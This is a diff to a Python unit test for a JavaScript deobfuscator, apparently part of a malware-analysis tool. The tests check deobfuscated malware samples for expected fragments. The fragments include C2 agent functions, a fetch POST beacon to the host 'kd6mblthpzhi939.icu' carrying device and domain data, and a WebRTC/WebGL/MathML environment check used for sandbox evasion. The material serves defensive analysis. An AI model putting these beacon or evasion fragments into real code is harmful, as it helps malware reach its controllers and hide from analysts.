@@ -3,6 +3,8 @@ from .. import TestUnitBase
 import inspect
 import re
 
+from test.lib.scripts import a_program
+
 
 class TestJsDeobfuscator(TestUnitBase):
 
@@ -185,8 +187,8 @@ class TestJsDeobfuscator(TestUnitBase):
     def test_double_string_obfuscation(self):
         data = self.download_sample('6577cce638a8dcbaa931abec340b5b0cbd66a2788d36017a7fbdaf0376add786')
         test = data | self.load() | str
-        for fragment in [
-            inspect.cleandoc(
+        for name, fragment in {
+            'main': inspect.cleandoc(
                 """
                 function main() {
                   const D = process.argv[0x2];
@@ -208,7 +210,7 @@ class TestJsDeobfuscator(TestUnitBase):
                 }
                 """
             ),
-            inspect.cleandoc(
+            'hooks': inspect.cleandoc(
                 """
                 async function onConnected() {
                   const D = activePanelUrl || await getActivePanelUrl();
@@ -228,7 +230,7 @@ class TestJsDeobfuscator(TestUnitBase):
                 }
                 """
             ),
-            inspect.cleandoc(
+            'builder': inspect.cleandoc(
                 """
                 function buildAgentPayload() {
                   const D = { ...getAgentInfo(), 'panelUrl': activePanelUrl || null };
@@ -239,8 +241,67 @@ class TestJsDeobfuscator(TestUnitBase):
                 }
                 """
             ),
-        ]:
-            self.assertIn(fragment, test)
+        }.items():
+            with self.subTest(name):
+                self.assertIn(fragment, test)
+
+    def test_function_inlining_sample(self):
+        data = self.download_sample('7ba80abe68799cd0ba291d6a652122d2c1a24484949e84c9e4bc0931d1f268ec')
+        test = data | self.load() | str
+        for name, fragment in {
+            'main': inspect.cleandoc(
+                """
+                (function() {
+                  setInterval(function() {
+                    try {
+                      window.parent.location.reload();
+                    } catch (e) {
+                      window.top.location.reload();
+                    }
+                  }, 120000);
+                })();
+                """
+            ),
+            'c2': a_program(
+                """
+                const U = await fetch('https://kd6mblthpzhi939.icu/api/ip-sync/sync', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ channelCode: V, deviceVersion: T, domain: dom })
+                });
+                if (!U.ok) {
+                  await U.json().catch(() => ({}));
+                }
+                """, 3
+            ),
+            'builder': a_program(
+                """
+                const t = new Promise((function(t, n) {
+                  return t(!['mozRTCPeerConnection', 'RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCIceGatherer'].some((t => t in globalThis)) && !globalThis.WebGLRenderingContext && !function() {
+                    const n = document.createElement('div');
+                    n.setAttribute("id", 'ldm_mml_t');
+                    n.innerHTML = '<math style=\\'display: none\\'><mrow mathcolor="blue"><mn>14</mn></mrow></math>';
+                    const r = void 0 !== document.body ? document.body : document.firstChild;
+                    r.appendChild(n);
+                    const o = 'rgb(0, 0, 255)' === globalThis.getComputedStyle(n.firstChild.firstChild, null).color;
+                    return r.removeChild(document.getElementById('ldm_mml_t')), o;
+                  }());
+                }));
+                """, 3
+            ),
+            'inlined': a_program(
+                """
+                const __inlined_fn_44ed6dac = function() {
+                  let r = {};
+                  function i(t) {
+                    return window.BigInt ? BigInt(t) : t;
+                  }
+                  r.U = i;
+                  const u = i(549755813887), s = i(39);
+                """
+            ),
+        }.items():
+            with self.subTest(name):
+                self.assertIn(fragment, test)
+
 
 class TestJsHostEnvironmentPin(TestUnitBase):
     """
